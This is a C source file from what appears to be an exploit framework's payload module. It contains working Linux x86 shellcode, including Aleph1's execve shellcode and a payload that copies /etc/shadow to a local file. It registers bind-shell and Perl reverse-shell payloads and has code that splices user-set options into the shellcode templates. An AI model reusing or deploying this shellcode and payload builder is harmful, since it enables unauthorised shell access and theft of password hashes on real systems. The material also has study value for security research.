
#include "payloads.h"
#include "exploits.h"
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <stdlib.h>

// aleph1's old shellcode (linux x86)
unsigned char aleph1_shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0"
"\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
"\x40\xcd\x80\xe8\xdc\xff\xff\xff%s";

struct payloadParam alephsOptions[MAX_NUM_OF_PARAMS] = {
    { "CMD", 1, STRING, NOT_SET, NULL, NOT_SET },
};
// end of aleph1's old shellcode (linux x86)

unsigned char catshadow_shellcode[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x19\x00\x00\x00\x63"
"\x61\x74\x20\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x20"
"\x3e\x20\x2e\x2f\x73\x68\x61\x64\x00\x57\x53\x89\xe1\xcd\x80";

unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0e\x00\x00\x00\x73"
"\x68\x3e\x60\x74\x74\x79\x60\x20\x32\x3e\x26\x31\x00\x57\x53"
"\x89\xe1\xcd\x80";

// http://www.shell-storm.org/shellcode/files/shellcode-849.php

struct payload payloads[PAYLOADS_NUMBER] = {
/*
	{ 0, "null", nullPayload, 0, NULL, 0, NULL, nullHelp },
	{ 1, "linux-x86-exec", execShellcode, 35, execOptions, 2, execInit, execShellcodeHelp },
	{ 2, "cmd-bind-awk", cmdBindAwkPayload, 95, cmdBindAwkOpts, 1, NULL, cmdBindAwkHelp },
	{ 3, "cmd-generic", cmdGenericPayload, 2, cmdGenericOpts, 1, NULL, cmdGenericHelp },
    { 4, "cmd-bind-nc", cmdBindNcPayload, 111, cmdBindNcOpts, 1, NULL, cmdBindNcHelp },
    { 5, "cmd-bind-perl", cmdBindPerlPayload, 238, cmdBindPerlOpts, 1, NULL, cmdBindPerlHelp },
    { 6, "cmd-reverse-perl", cmdReversePerlPayload, 238, cmdReversePerlOpts, 2, NULL, cmdReversePerlHelp },
*/
};

int payloadsInit()
{
    payloads[0] = nullPayload;
    payloads[1] = x86LnxExec;
    payloads[2] = cmdBindAwk;
    payloads[3] = cmdGeneric;
    payloads[4] = cmdBindNc;
    payloads[5] = cmdBindPerl;
    payloads[6] = cmdReversePerl;
}

// TODO: change name & make static
int xploitGetPayloadID(char *name)
{
    int i;

    if(!name) {
        return -1;
    }

    for(i=0; i<PAYLOADS_NUMBER; ++i) {
        if(strncmp(name, payloads[i].name, PAYLOAD_NAME_LENGTH) == 0) {
            return payloads[i].id;
        }
    }

    //TODO: return XPLOIT_ERROR;
    return -1;
}

static void showPayloadOpts(int id)
{
    struct payloadParam *param;
    int i;
    int fieldLenSetting = 0;
    int fieldLenName = 0;

    // find longest default setting
    for(i=0; i<payloads[id].paramsNum; ++i) {
        param = &payloads[id].params[i];
        if(param->strValueLen > fieldLenSetting)
            fieldLenSetting = param->strValueLen;

        if(strlen(param->name) > fieldLenName)
            fieldLenName = strlen(param->name);
    }

    if(fieldLenName < strlen("Name"))
       fieldLenName = strlen("Name");

    if(fieldLenSetting < strlen("Default setting"))
       fieldLenSetting = strlen("Default setting");

    printf("\nPayload options:\n\n");

    printf("%-*s  %-*s  %s\n", fieldLenName, "Name", fieldLenSetting, "Default setting", "Required");
    printf("%-*s  %-*s  %s\n", fieldLenName, "----", fieldLenSetting, "---------------", "--------");

    for(i=0; i<payloads[id].paramsNum; ++i) {
        param = &payloads[id].params[i];
        if(param->required != INTERNAL) {
            param = &payloads[id].params[i];

            printf("%-*s  %-*s  %s\n", fieldLenName, param->name, fieldLenSetting, 
                param->strValueLen ? param->strValue : "",
                param->required == REQUIRED ? "yes" : "no"
            );
        }
    }

}

/*
static void showExploitDetails(int id)
{
    if(exploits[id].det->exploitType == REMOTE)
        printf("Type: remote\n");
    else
        printf("Type: local\n");
}
*/

void xploitShowPayloadHelp(char *name)
{
    int id;

    id = xploitGetPayloadID(name);
    if(id == -1) {
        printf("no such payload\n");
        return;
    }

    if(payloads[id].help) {
        printf("%s%s%s", txtblu, payloads[id].name, txtrst);
        printf(" - ");
        payloads[id].help();
    }
    /*
    if(payloads[id].det)
        showPayloadsDetails(id);
    */
    showPayloadOpts(id);
}

void xploitShowPayloads()
{
    int i;

    for(i=0; i<PAYLOADS_NUMBER; ++i) {
        if(payloads[i].help) {
            printf("%s%s%s", txtblu, payloads[i].name, txtrst);
            printf(" - ");
            payloads[i].help();
        }
    }
}

static int buildPayload(char *dest, char *fmt, unsigned int fmt_len, struct payloadParam *param, unsigned int paramNum)
{
    int i;
    char *ptr;
    struct payloadParam *currentParam;

    ptr = dest;
    currentParam = param;
    for(i=0; i<fmt_len; ++i) {
        if(fmt[i] != '%') {
            *ptr++ = fmt[i];
        }
        else { // param?
            if(fmt[i+1] == 'd') {   // integer param

                // TODO: this needs to be tested

                // convert param to integer
                char temp[sizeof(unsigned int) + 1] = {0};
                *((unsigned int *)&temp[0]) = atoi(currentParam->strValue);

                printf("param name: %s\n", currentParam->name);

                // copy param to payload
                memcpy(ptr, temp, sizeof(unsigned int));
                ptr += sizeof(unsigned int);
                currentParam++;
                ++i;
            }
            else if(fmt[i+1] == 's') { // string param
                printf("param name: %s\n", currentParam->name);
                memcpy(ptr, currentParam->strValue, currentParam->strValueLen);
                ptr += currentParam->strValueLen;
                currentParam++;
                ++i;
            }
            else { // not param
                *ptr++ = fmt[i];
            } 
        }
    }

    return 0;
}

// TODO: disallow to set INTERNAL params
// Used only for strings (no \0 in content)
int xploitSetPayloadOpt(struct Xploit *xp, char *paramName, void *newValue)
{
    return setInternalPayloadOpt(xp, paramName, newValue, strlen(newValue));
}

// supports \0 in newValue's content
int setInternalPayloadOpt(struct Xploit *xp, char *paramName, void *newValue, unsigned int newValueLen)
{
    struct payloadParam *param;
    int i;
    int found = 0;

    if((char *)newValue == NULL)
        return -1;

    if((unsigned int)newValueLen == 0)
        return -1;

    for(i=0; i < xp->currentPayload->paramsNum && !found; ++i) {
        param = &xp->currentPayload->params[i];
        if(strcmp(param->name, paramName) == 0) {

            // free old content if any
            if(param->strValue != NULL) {
                free(param->strValue);
                param->strValueLen = 0;
            }

            // prepare new content
            param->strValue = (char *)malloc(newValueLen + 1);
            if(param->strValue == NULL)
                return -1;

            memcpy(param->strValue, newValue, newValueLen);
            param->strValueLen = newValueLen;
            param->strValue[param->strValueLen] = '\0';

            // done, param found and set
            found = 1;
        }
    }

    if(!found) {
        //library error: unrecognized param for chosen payload
        printf("unrecognized option: %s\n", paramName);
        return -1;
    }

    return 0;
}

int xploitSetPayload(struct Xploit *xp, char *name)
{
    int id;
    int i;
    struct payloadParam *param;

    if(!xp) {
        //TODO: report library error: bad Xploit context
        return -1;
    }

    // check if payload exists
    if((id = xploitGetPayloadID(name)) == -1) {
        // set library error: payload doesn't exist
        return -1;
    }

    // delete it if payload already exists for current context
    if(xp->currentPayload != NULL) {
        // TODO: handle it more properly: also free payloadParam's data
        free(xp->currentPayload);
    }

    xp->currentPayload = (struct payload *)malloc(sizeof(struct payload));
	if(xp->currentPayload == NULL) {
        // set library error: out of memory
		return -1;
    }

    // init params
    if(payloads[id].paramsNum > 0) {
        xp->currentPayload->params = (struct payloadParam *)malloc(payloads[id].paramsNum * sizeof(struct payloadParam));
        if(xp->currentPayload->params == NULL) {
            // set library error: out of memory
            free(xp->currentPayload);
            return -1;
        }

        // set initial values for params
        for(i=0; i < payloads[id].paramsNum; ++i) {
            param = &payloads[id].params[i];
            strncpy(xp->currentPayload->params[i].name, param->name, PAYLOAD_NAME_LENGTH);
            xp->currentPayload->params[i].required = param->required;
            xp->currentPayload->params[i].type = param->type;
            xp->currentPayload->params[i].strValue = NULL;
            xp->currentPayload->params[i].strValueLen = NOT_SET;
        }
    }

    // set initial values for payload
    xp->currentPayload->paramsNum = payloads[id].paramsNum;
    xp->currentPayload->id = id; 
    strncpy(xp->currentPayload->name, payloads[id].name, PAYLOAD_NAME_LENGTH);
    xp->currentPayload->initOptionsfunc = payloads[id].initOptionsfunc;

    // these values will be set when payload will be constructed
    xp->currentPayload->data = NULL;
    xp->currentPayload->len = NOT_SET;
}

int checkReqPayloadOpts(struct payload *p)
{
    int i;
    struct payloadParam *param;

    // check if REQUIRED options are set
    for(i=0; i<p->paramsNum; ++i) {
        param = &p->params[i];
        if(param->required == REQUIRED) {
            // check if set
            if(param->strValue == NULL || param->strValueLen == 0) {
                // set library error: required payload option ... not set
                fprintf(stderr, "param: %s not set\n", param->name);
                return -1;
            }
        }
    }

    return 0;
}

int constructPayload(struct Xploit *xp)
{
    int i;
    struct payload *p = xp->currentPayload;
    char *fmt = payloads[p->id].data;
    unsigned int fmt_len = payloads[p->id].len;
    struct payloadParam *param;
    unsigned int paramsLen = 0;

    // calculate params length (TODO: reconsider it NOT_REQUIRED also should be processed)
    for(i=0; i<p->paramsNum; ++i) {
        param = &p->params[i];
        if(param->type == INTEGER)
            paramsLen += sizeof(unsigned int);
        else if(param->type == STRING)
            paramsLen += param->strValueLen;
    }

    // fill prepare payload's data and len fields
    p->data = (char *)malloc(fmt_len + paramsLen + 64);
    if(p->data == NULL) {
        // set lib error
        fprintf(stderr, "failed to allocate memory\n");
        return -1;
    }
    p->len = fmt_len + paramsLen;

    // construct payload using chosen params
    buildPayload(p->data, fmt, fmt_len, p->params, p->paramsNum);

    return 0;
}
